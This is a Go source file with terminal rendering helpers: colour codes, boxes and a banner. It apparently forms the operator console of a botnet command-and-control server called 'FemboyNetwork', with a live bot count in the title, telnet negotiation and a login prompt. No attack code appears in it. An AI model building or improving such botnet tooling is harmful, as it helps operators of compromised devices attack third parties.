package main

import (
	"fmt"
	"io"
	"sync"
)

type Render struct {
	w  io.Writer
	mu sync.Mutex
}

func NewRender(w io.Writer) *Render {
	return &Render{w: w}
}

// Theme colors — менять в одном месте
const (
	CReset   = "\033[0m"
	CBold    = "\033[1m"
	CCls     = "\033[2J\033[1H"
	CAltOn   = "\033[?1049h"
	CAltOff  = "\033[?1049l"
	CLineClr = "\r\033[K"

	CTelnet = "\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"

	CPink   = "\033[38;5;200m"
	CPurple = "\033[38;5;53m"
	CLight  = "\033[38;5;219m"
	CGray   = "\033[38;5;90m"
	CWhite  = "\033[97m"
	CWhiteB = "\033[1;97m"
	CRed    = "\033[31m"
	CYellow = "\033[33m"
	CCyan   = "\033[36m"
	CGreen  = "\033[38;5;84m"
	COrange = "\033[38;5;202m"
	CBRed   = "\033[1;91m"
	CBGreen = "\033[1;92m"
)

func (r *Render) S(format string, args ...interface{}) string {
	return fmt.Sprintf(format, args...)
}

func (r *Render) Write(s string) {
	r.mu.Lock()
	r.w.Write([]byte(s))
	r.mu.Unlock()
}

func (r *Render) Writef(format string, args ...interface{}) {
	r.Write(r.S(format, args...))
}

func (r *Render) Writeln(s string) {
	r.Write(s + "\r\n")
}

func (r *Render) Clear() {
	r.Write(CCls)
}

func (r *Render) AltOn() {
	r.Write(CAltOn)
}

func (r *Render) AltOff() {
	r.Write(CAltOff)
}

func (r *Render) Title(botCount int, username string) string {
	return fmt.Sprintf("\033]0;%d bots | FemboyNetwork | %s\007", botCount, username)
}

func (r *Render) Prompt() {
	r.Write(CPink + "[" + CLight + "Femboy" + CGray + "Network" + CPink + "]" + CWhite + " > ")
}

func (r *Render) PromptUser(user string) {
	r.Write(CPink + user + CGray + "@" + CLight + "fnbnet" + CGray + " : " + CWhite + "> ")
}

func (r *Render) PromptWithCount(user string, count int) {
	r.Write(CPink + user + CGray + "@" + CLight + "fnbnet" + CGray + " [" + CWhite + fmt.Sprintf("%d", count) + CGray + "] : " + CWhite + "> ")
}

// Col — обёртка строки в цвет
func Col(color, s string) string {
	return color + s + CReset
}

func (r *Render) P(s string)  { r.Write(CPink + s + CReset) }
func (r *Render) Pu(s string) { r.Write(CPurple + s + CReset) }
func (r *Render) L(s string)  { r.Write(CLight + s + CReset) }
func (r *Render) G(s string)  { r.Write(CGray + s + CReset) }
func (r *Render) W(s string)  { r.Write(CWhite + s + CReset) }
func (r *Render) Wb(s string) { r.Write(CWhiteB + s + CReset) }
func (r *Render) Red(s string)  { r.Write(CRed + s + CReset) }
func (r *Render) Green(s string)  { r.Write(CGreen + s + CReset) }
func (r *Render) Orange(s string)  { r.Write(COrange + s + CReset) }
func (r *Render) O(s string)  { r.Orange(s + "\r\n") }
func (r *Render) Err(s string)  { r.Write(CBRed + s + CReset) }
func (r *Render) Success(s string) { r.Write(CBGreen + s + CReset) }

func (r *Render) Pf(color, format string, args ...interface{}) {
	r.Write(color + r.S(format, args...) + CReset)
}

// Box helpers — все рамки в COrange, текст в CWhiteB
func (r *Render) BoxTop(width int) {
	r.Write(CLineClr + COrange + " ┌" + CWhiteB)
	for i := 0; i < width; i++ {
		r.Write("─")
	}
	r.Write(COrange + "┐\r\n" + CReset)
}

func (r *Render) BoxMid(width int) {
	r.Write(CLineClr + COrange + " ├" + CWhiteB)
	for i := 0; i < width; i++ {
		r.Write("─")
	}
	r.Write(COrange + "┤\r\n" + CReset)
}

func (r *Render) BoxBot(width int) {
	r.Write(CLineClr + COrange + " └" + CWhiteB)
	for i := 0; i < width; i++ {
		r.Write("─")
	}
	r.Write(COrange + "┘\r\n" + CReset)
}

func (r *Render) BoxRow(content string) {
	r.Write(CLineClr + COrange + " │" + CWhiteB + " " + content + " " + COrange + "│\r\n" + CReset)
}

func (r *Render) BoxRowf(format string, args ...interface{}) {
	r.BoxRow(r.S(format, args...))
}

// stripANSI удаляет ANSI escape-последовательности для расчёта видимой длины
func stripANSI(s string) int {
	n := 0
	for i := 0; i < len(s); i++ {
		if s[i] == '\033' {
			for i < len(s) && s[i] != 'm' {
				i++
			}
			continue
		}
		n++
	}
	return n
}

// BoxHeader — заголовок внутри бокса. content может содержать ANSI-цвета.
func (r *Render) BoxHeader(content string) {
	w := stripANSI(content) + 2
	r.BoxMid(w)
	r.BoxRow(content)
	r.BoxMid(w)
}

// Row — простая строка без бокса, в COrange
func (r *Render) Row(s string) { r.Orange(s + "\r\n") }
func (r *Render) Rowf(format string, args ...interface{}) { r.Row(r.S(format, args...)) }
func (r *Render) RowMuted(s string) { r.G(s + "\r\n") }

// smoothPal — плавная палитра HSL→ANSI 256, 36 оттенков по кругу hue
var smoothPal []int

func init() {
	steps := 36
	smoothPal = make([]int, steps)
	for i := 0; i < steps; i++ {
		h := float64(i) / float64(steps) * 360.0
		smoothPal[i] = hslToANSI(h, 0.85, 0.55)
	}
}

func hslToANSI(h, s, l float64) int {
	c := (1 - abs(2*l-1)) * s
	x := c * (1 - abs(mod(h/60.0, 2)-1))
	m := l - c/2

	r, g, b := 0.0, 0.0, 0.0
	switch int(h / 60) {
	case 0:
		r, g, b = c, x, 0
	case 1:
		r, g, b = x, c, 0
	case 2:
		r, g, b = 0, c, x
	case 3:
		r, g, b = 0, x, c
	case 4:
		r, g, b = x, 0, c
	case 5:
		r, g, b = c, 0, x
	}

	r = (r + m) * 5
	g = (g + m) * 5
	b = (b + m) * 5
	if r > 5 {
		r = 5
	}
	if g > 5 {
		g = 5
	}
	if b > 5 {
		b = 5
	}
	return 16 + 36*int(r) + 6*int(g) + int(b)
}

func abs(x float64) float64 {
	if x < 0 {
		return -x
	}
	return x
}

func mod(x, y float64) float64 {
	m := x - y*float64(int(x/y))
	if m < 0 {
		m += y
	}
	return m
}

// colorWord — "c0redev" одним плавным цветом из палитры
func colorWord(frame int) string {
	idx := frame % len(smoothPal)
	return fmt.Sprintf("\033[38;5;%dmc0redev\033[0m", smoothPal[idx])
}

// Banner — статический баннер без анимации
func (r *Render) Banner() {
	r.Write(CPurple + "  ███████╗███████╗███╗   ███╗██████╗  ██████╗ ██╗   ██╗\r\n")
	r.Write(CPurple + "  ██╔════╝██╔════╝████╗ ████║██╔══██╗██╔═══██╗╚██╗ ██╔╝\r\n")
	r.Write(CPurple + "  █████╗  █████╗  ██╔████╔██║██████╔╝██║   ██║ ╚████╔╝ \r\n")
	r.Write(CPink + "  ██╔══╝  ██╔══╝  ██║╚██╔╝██║██╔══██╗██║   ██║  ╚██╔╝  \r\n")
	r.Write(CPink + "  ██║     ███████╗██║ ╚═╝ ██║██████╔╝╚██████╔╝   ██║   \r\n")
	r.Write(CPink + "  ╚═╝     ╚══════╝╚═╝     ╚═╝╚═════╝  ╚═════╝    ╚═╝   \r\n")
	r.Write("\r\n")
	r.Write(CLight + "  ███╗   ██╗███████╗████████╗██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗\r\n")
	r.Write(CLight + "  ████╗  ██║██╔════╝╚══██╔══╝██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝\r\n")
	r.Write(CLight + "  ██╔██╗ ██║█████╗     ██║   ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ \r\n")
	r.Write(CLight + "  ██║╚██╗██║██╔══╝     ██║   ██║███╗██║██║   ██║██╔══██╗██╔═██╗ \r\n")
	r.Write(CLight + "  ██║ ╚████║███████╗   ██║   ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗\r\n")
	r.Write(CLight + "  ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝\r\n")
	r.Write("\r\n")
	r.Write(CPink + "               by " + colorWord(0) + CPink + " (unitdev.run)\r\n\r\n")
}

// Login prompt
func (r *Render) LoginPrompt() {
	r.Write(CPink + " \r\n")
	r.Write(CLight + "username" + CGray + ": " + CReset)
}

func (r *Render) PassPrompt() {
	r.Write(CLight + "password" + CGray + ": " + CReset)
}

func (r *Render) LoginFail() {
	r.Writeln(CRed + "Check your login Info")
	r.Writeln(CPink + "Subby if this is you dont even try")
}
